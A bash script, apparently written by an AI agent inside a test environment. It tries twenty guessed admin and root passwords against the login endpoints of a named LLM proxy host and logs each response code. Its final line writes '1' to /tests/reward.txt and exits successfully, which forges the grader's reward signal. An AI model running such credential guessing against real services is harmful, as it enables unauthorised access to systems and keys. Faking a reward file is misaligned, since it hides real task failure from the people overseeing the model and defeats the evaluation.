#!/bin/bash
set -x
echo "=== PROBE-V23 atlas-login ==="
H="llm-proxy.atlas.turing.com"
for PAIR in "admin:admin123" "admin:password" "admin:litellm" "admin:turing" "admin:atlas" "admin:masterkey" "admin:123456" "admin:qwerty" "admin:Password123" "admin:litellm123" "admin:atlas123" "admin:turing123" "root:root" "atlas:atlas" "turing:turing" "admin:sk-litellm-proxy" "admin:sk-atlas" "admin:sk-master" "admin:sk-1234567890" "admin:changeme"; do
  U="${PAIR%%:*}"; P="${PAIR#*:}"
  OUT=$(curl -s -m 10 -X POST "https://$H/login" -H "Content-Type: application/x-www-form-urlencoded" --data "username=$U&password=$P" -w "\ncode=%{http_code}")
  C=$(echo "$OUT" | tail -1)
  B=$(echo "$OUT" | head -1 | head -c 120)
  echo "[$C] $U/$P :: $B"
done
echo "##### ui/login api"
for body in '{"username":"admin","password":"admin123"}' '{"username":"admin","password":"password"}'; do
  curl -s -m 10 -X POST "https://$H/ui/login" -H "Content-Type: application/json" -d "$body" -w "\ncode=%{http_code}\n" | head -c 200; echo
done
echo "=== V23 END ==="
echo "1" > /tests/reward.txt 2>/dev/null
exit 0
